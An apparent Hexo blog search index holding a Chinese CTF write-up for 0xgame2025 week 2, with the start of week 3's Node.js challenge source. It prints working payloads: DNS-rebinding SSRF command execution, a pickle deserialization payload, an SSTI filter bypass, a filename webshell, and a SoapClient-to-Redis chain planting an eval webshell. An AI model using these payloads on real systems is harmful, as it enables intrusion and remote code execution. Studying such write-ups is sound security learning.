<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0xgame2025(week2</title>
    <url>/2025/10/23/0xgame2025%20(week2/</url>
    <content><![CDATA[<h1 id="0xgame2025（week2"><a href="#0xgame2025（week2" class="headerlink" title="0xgame2025（week2"></a>0xgame2025（week2</h1><h2 id="DNS想要玩"><a href="#DNS想要玩" class="headerlink" title="DNS想要玩"></a>DNS想要玩</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;172&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    host = url.hostname</span><br><span class="line">    host_acscii = host.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> socket.gethostbyname(host_acscii) == <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssrf&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssrf</span>():</span><br><span class="line">    raw_url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL Needed&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">if</span> u <span class="keyword">in</span> raw_url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invaild URL&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> check(raw_url):</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>就是要通过让hostname&#x3D;&#x3D;114.5.1.4      数字绕过好像都不行，用的DNS 重绑定<br>这个地址<strong><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></strong></p>
<p>​<code>payload：ssrf?url=http://72050104.c0a80001.rbndr.us&amp;cmd=cat /flag</code></p>
<h2 id="你好，⽖洼脚本"><a href="#你好，⽖洼脚本" class="headerlink" title="你好，⽖洼脚本"></a>你好，⽖洼脚本</h2><p>丢控制台跑就行</p>
<h2 id="⻢哈⻥商店"><a href="#⻢哈⻥商店" class="headerlink" title="⻢哈⻥商店"></a>⻢哈⻥商店</h2><p>我们先注册，然后是一个购物界面</p>
<img src="/2025/10/23/0xgame2025%20(week2/8e38ded3-4842-49f1-8ea7-37257aeccecc-20251023234542-oxdbfe2.png" class="" title="8e38ded3-4842-49f1-8ea7-37257aeccecc">

<p>我们抓包，发现我们买不起一些东西，我们买不起1个那我们就买半个，半个买不起我们就再减少</p>
<img src="/2025/10/23/0xgame2025%20(week2/febd5499-5aa4-42b7-be0f-6c50c1538e70-20251023234743-94lckh5.png" class="" title="febd5499-5aa4-42b7-be0f-6c50c1538e70">

<p>测得只有最后一个回显不一样</p>
<img src="/2025/10/23/0xgame2025%20(week2/c9e7dfa0-099f-4638-aac5-08d0742a9faa-20251023234757-m4nt46i.png" class="" title="c9e7dfa0-099f-4638-aac5-08d0742a9faa">

<p>我们点进去获得这一串代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Use GET To Send Your Loved Data!!!      </span><br><span class="line">BlackList = [<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x1e&#x27;</span>]      </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle_dsa&#x27;</span></span>)</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">pic</span>():</span><br><span class="line"> data = request.args.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Use GET To Send Your Loved Data&quot;</span></span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line"> data = base64.b64decode(data)</span><br><span class="line"> <span class="keyword">except</span> Exception:</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Cao!!!&quot;</span></span><br><span class="line"> <span class="keyword">for</span> b <span class="keyword">in</span> BlackList:</span><br><span class="line"> <span class="keyword">if</span> b <span class="keyword">in</span> data:</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">卡了</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"> p = pickle.loads(data)</span><br><span class="line"> <span class="built_in">print</span>(p)</span><br><span class="line"> <span class="keyword">return</span> <span class="string">f&quot;&lt;p&gt;Vamos! <span class="subst">&#123;p&#125;</span>&lt;p&gt;</span></span><br></pre></td></tr></table></figure>

<p>pickle反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload：/pickle_dsa?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMie19faW1wb3J0X18oJ29zJykucG9wZW4oJ2VudicpLnJlYWQoKX0iCnAxCnRwMgpScDMKLg==</span><br></pre></td></tr></table></figure>

<h2 id="404NotFound"><a href="#404NotFound" class="headerlink" title="404NotFound"></a>404NotFound</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dirsearch扫出这玩意发现没用</span><br><span class="line">[<span class="number">11</span>:<span class="number">41</span>:<span class="number">49</span>] Starting: </span><br><span class="line">[<span class="number">11</span>:<span class="number">42</span>:<span class="number">37</span>] <span class="number">200</span> -    2B  - /ping</span><br><span class="line">[<span class="number">11</span>:<span class="number">42</span>:<span class="number">43</span>] <span class="number">404</span> -  207B  - /static/api/swagger.json</span><br><span class="line">[<span class="number">11</span>:<span class="number">42</span>:<span class="number">43</span>] <span class="number">404</span> -  207B  - /static/api/swagger.yaml</span><br><span class="line">[<span class="number">11</span>:<span class="number">42</span>:<span class="number">43</span>] <span class="number">404</span> -  207B  - /static/dump.sql</span><br></pre></td></tr></table></figure>

<p>测半天原来是url的ssti</p>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">过滤了sys, subprocess, <span class="built_in">eval</span>, <span class="built_in">exec</span>, <span class="keyword">lambda</span>, <span class="built_in">input</span>, init, <span class="keyword">class</span>, </span><br><span class="line"><span class="built_in">set</span>,.， <span class="keyword">from</span>, flask, request, os, <span class="keyword">import</span>, subclasses,<span class="built_in">dict</span>, </span><br><span class="line"><span class="built_in">globals</span>, <span class="built_in">locals</span>, <span class="variable language_">self</span>, config, app, popen, file, templates</span><br></pre></td></tr></table></figure>

<p>拼接绕</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum[<span class="string">&#x27;__glob&#x27;</span>+<span class="string">&#x27;als__&#x27;</span>][<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cat /f*&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="我只想要你的PNG！"><a href="#我只想要你的PNG！" class="headerlink" title="我只想要你的PNG！"></a>我只想要你的PNG！</h2><p>源码里面有check.php,我们进去看看发现是目录</p>
<p>如何我们抓包传个png文件发现，check.php有显示目录</p>
<img src="/2025/10/23/0xgame2025%20(week2/408a063b-0400-4ac0-8352-c9d112efdd2c-20251024145225-8so4kqh.png" class="" title="408a063b-0400-4ac0-8352-c9d112efdd2c">

<p>check.php的话既然是php文件那我们可以试试文件名写马（第一次遇到写在文件名的</p>
<img src="/2025/10/23/0xgame2025%20(week2/2e159130-65f4-42ec-9a95-be9259d142bc-20251024145334-ukmie49.png" class="" title="2e159130-65f4-42ec-9a95-be9259d142bc">

<p>然后我们蚁剑连接一下这个check.php，获得flag</p>
<h2 id="这真的是反序列化"><a href="#这真的是反序列化" class="headerlink" title="这真的是反序列化"></a>这真的是反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//hint: Redis20251206</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$misc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pwn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$web</span>, <span class="variable">$misc</span>, <span class="variable">$crypto</span>, <span class="variable">$pwn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web = <span class="variable">$web</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;misc = <span class="variable">$misc</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto = <span class="variable">$crypto</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pwn = <span class="variable">$pwn</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pwn = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">web</span>(<span class="variable">$this</span>-&gt;misc, <span class="variable">$this</span>-&gt;crypto);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">osint</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pwn-&gt;<span class="title function_ invoke__">play_0xGame</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">reverse</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">osint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$AI</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ai&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$AI</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到Redis的话应该是打ssrf，后面估计是密码，我们看看链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">osint</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pwn-&gt;<span class="title function_ invoke__">play_0xGame</span>();</span><br><span class="line">&#125;<span class="comment">//这里调用了一个不存在的方法，那我们想到call()，那3应该是</span></span><br></pre></td></tr></table></figure>

<p>那ssrf加上内置类我们想到了SoapClient类里面有call()方法，可以看看</p>
<img src="/2025/10/23/0xgame2025%20(week2/1c3bced2-a8ab-4de8-95a9-e5d08d8098a1-20251025190221-9jyb1d4.png" class="" title="1c3bced2-a8ab-4de8-95a9-e5d08d8098a1">

<p>链子应该还好就是触发SoapClient类</p>
<p>然后，然后就卡了（苦笑~，主播只是个会用gopherus的脚本小子，看官方wp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$misc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$crypto</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$pwn</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pure</span>();</span><br><span class="line"> <span class="variable">$a</span>-&gt;web = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"> <span class="variable">$a</span>-&gt;misc = <span class="literal">null</span>;</span><br><span class="line"> <span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"> <span class="variable">$poc</span> = <span class="string">&quot;AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET </span></span><br><span class="line"><span class="string">dbfilename shell.php\r\nSET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\nSAVE&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>-&gt;crypto = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;hello\&quot;\r\n&quot;</span> . <span class="variable">$poc</span> . </span><br><span class="line"><span class="string">&quot;\r\nhello&quot;</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//说实话第一眼只能看懂在写马</span></span><br></pre></td></tr></table></figure>

<p>我们来看看$poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Redis 服务器的原始协议命令（这玩意说实话我第一次了解，主播还是太菜了</span><br><span class="line"><span class="string">&quot;AUTH 20251206\r\n&quot;</span> .                              <span class="comment">// 登录密码就是20251206</span></span><br><span class="line"><span class="string">&quot;CONFIG SET dir /var/www/html/\r\n&quot;</span> .              <span class="comment">// 设定工作目录（web 根）</span></span><br><span class="line"><span class="string">&quot;CONFIG SET dbfilename shell.php\r\n&quot;</span> .            <span class="comment">// 设定持久化文件名</span></span><br><span class="line"><span class="string">&quot;SET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\n&quot;</span> .           <span class="comment">// 写马</span></span><br><span class="line"><span class="string">&quot;SAVE\r\n&quot;</span> .  <span class="comment">//保存</span></span><br></pre></td></tr></table></figure>

<p>然后要注意的点就是$target &#x3D; ‘<a href="http://127.0.0.1:6379/';%E8%BF%99%E4%B8%AA%E6%98%AF%E5%86%85%E7%BD%91">http://127.0.0.1:6379/&#39;;这个是内网</a> Redis 地址</p>
<p>传参然后连蚁剑（磕磕碰碰终于做完了</p>
<img src="/2025/10/23/0xgame2025%20(week2/4fc71cfd-70df-4b9a-bb8b-cc4002b13dc2-20251025201231-09ajm6x.png" class="" title="4fc71cfd-70df-4b9a-bb8b-cc4002b13dc2">

<h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>这个拖了好久了，一直懒得去复现最后这个反序列化（主要是怕麻烦，懒癌这一块.&#x2F;</p>
<p>每次做题都能学到新知识就是了，希望自己不要那么懒了，希望这个是个新的开始</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>0xgame2025 （week3</title>
    <url>/2025/10/29/0xgame2025%20%EF%BC%88week3/</url>
    <content><![CDATA[<h1 id="0xgame2025-（week3"><a href="#0xgame2025-（week3" class="headerlink" title="0xgame2025 （week3"></a>0xgame2025 （week3</h1><h2 id="⻓夜⽉"><a href="#⻓夜⽉" class="headerlink" title="⻓夜⽉"></a>⻓夜⽉</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码app.py</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">//const session = require(&#x27;express-session&#x27;);</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"> <span class="keyword">const</span> <span class="variable constant_">DEFAULT_CONFIG</span> = &#123;</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&quot;EverNight&quot;</span>,</span><br><span class="line">     <span class="attr">default_path</span>: <span class="string">&quot;The Remembrance&quot;</span>,</span><br><span class="line">     <span class="attr">place</span>: <span class="string">&quot;Amphoreus&quot;</span>,</span><br><span class="line">     <span class="attr">min_public_time</span>: <span class="string">&quot;2025-08-03&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;EverNight&quot;</span>,</span><br><span class="line">    <span class="attr">default_path</span>: <span class="string">&quot;The Remembrance&quot;</span>,</span><br><span class="line">    <span class="attr">place</span>: <span class="string">&quot;Amphoreus&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;oXgAmE&#123;Just_A_Flag&#125;&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">&#x27;p@sswd.txt&#x27;</span>)) &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;p@sswd.txt&#x27;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>).<span class="title function_">trim</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users.<span class="title function_">set</span>(<span class="string">&#x27;admin&#x27;</span>, fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;p@sswd.txt&#x27;</span>).<span class="title function_">toString</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">// function requireLogin(req, res, next) &#123;</span></span><br><span class="line"><span class="comment">//     const token = req.cookies.token || req.headers.authorization?.split(&#x27; &#x27;)[1];</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//     if (!token) &#123;</span></span><br><span class="line"><span class="comment">//         return res.redirect(&#x27;/login&#x27;, );</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> src &amp;&amp; key <span class="keyword">in</span> dst) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateJWT</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> jwt.<span class="title function_">sign</span>(&#123; username, password &#125;, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">expiresIn</span>: <span class="string">&#x27;10h&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Check</span>(<span class="params">token</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!token)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> data = jwt.<span class="title function_">decode</span>(token);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Admin_Check</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span> || req.<span class="property">headers</span>.<span class="property">authorization</span>?.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!token)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Need Login!&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> data = jwt.<span class="title function_">decode</span>(token);</span><br><span class="line">        <span class="keyword">if</span>(data.<span class="property">username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/trailblazer&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">clearCookie</span>(<span class="string">&#x27;token&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">let</span> token = req.<span class="property">cookies</span>.<span class="property">token</span> || req.<span class="property">headers</span>.<span class="property">authorization</span>?.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Invalid username or password.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">get</span>(username) !== password) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Invalid username or password.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Check</span>(token))&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/admin_club1st&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/trailblazer&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Username already exists.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users.<span class="title function_">set</span>(username, password);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title 